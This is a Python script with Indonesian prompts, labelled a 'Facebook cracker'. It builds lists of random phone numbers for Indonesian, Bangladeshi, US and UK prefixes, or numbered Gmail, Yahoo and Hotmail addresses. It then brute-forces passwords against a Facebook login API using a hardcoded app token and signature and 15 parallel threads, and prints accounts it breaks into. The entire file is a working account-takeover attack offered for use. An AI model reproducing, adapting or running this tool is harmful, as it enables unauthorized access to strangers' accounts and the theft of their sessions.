#Coded by DulLah (fb.me/dulahz)
#Recode By Ahmadganss
import os, re, requests, concurrent.futures
from random import randint

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
        break
  except: pass

def random_numbers_id():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  Isi nomor awalnya ya kaka
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 62877
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_numbers():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  Isi nomor awalnya ya kaka
  Harus 5 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 88019
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 5 digit ya kaka ga boleh kurang.') if len(kode) < 5 else ''
  exit('  Nomor harus 5 digit ya kaka ga boleh lebih.') if len(kode) > 5 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_numbers_us():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  Isi nomor awalnya ya kaka
  Harus 4 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 1714
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 4 digit ya kaka ga boleh kurang.') if len(kode) < 4 else ''
  exit('  Nomor harus 4 digit ya kaka ga boleh lebih.') if len(kode) > 4 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[4:]), str(e[5:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def random_numbers_uk():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM NUMBERS ]

  Isi nomor awalnya ya kaka
  Harus 3 digit gak boleh kurang dan gak boleh lebih.
  Contoh: 447
  ''')
  kode=str(input('  Masukan nomor awal: '))
  exit('  Nomor harus 3 digit ya kaka ga boleh kurang.') if len(kode) < 3 else ''
  exit('  Nomor harus 3 digit ya kaka ga boleh lebih.') if len(kode) > 3 else ''
  jml=int(input('''
  Masukan jumlah nomor yang akan dibuat contoh: 10
  Jumlah: '''))
  [data.append({'user': str(e), 'pw':[str(e[3:]), str(e[4:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,9)]) for e in range(jml)]]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')



def random_email():
  data = []
  os.system('cls' if os.name == 'nt' else 'clear')
  print('''
  [ FACEBOOK CRACKER RANDOM EMAIL ]

  Isi nama penggunanya ya kaka
  Contoh: widya
  ''')
  nama=input('  Nama pengguna: ')
  domain=input('''
  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
  pilih (g,y,h): ''').lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
  jml=int(input('''
  Masukan jumlah email yang akan dibuat contoh: 10
  Jumlah: '''))
  setpw=input('''
  Set password yg mendekati nama pengguna
  contoh: widya123,widya1234
  Set password: ''').split(',')
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  print('''
  Semoga hari ini kaka beruntung :)
  Tunggu ya kak jgn di tutup....
  ''')
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  print('\n  Sudah selesai kak')

def pilih():
  print('''
1.Crack dari nomor indo
2.Crack dari nomor bangladesh
3.Crack Dari nomor Us
4.Crack Dari nomor Uk
5.Crack Dari Email

  ''')
  pil=int(input('  Pilih mana manis?: '))
  if pil == 1:
    random_numbers_id()
  elif pil == 2:
    random_numbers()
  elif pil == 3:
    random_numbers_us()
  elif pil == 4:
    random_numbers_uk()
  elif pil == 5:
    random_email()
  else:
    exit('  Goblokk')
 
pilih() if __name__ == '__main__' else exit('Maaf ada yang error kaka , silahkan coba lagi yahh.')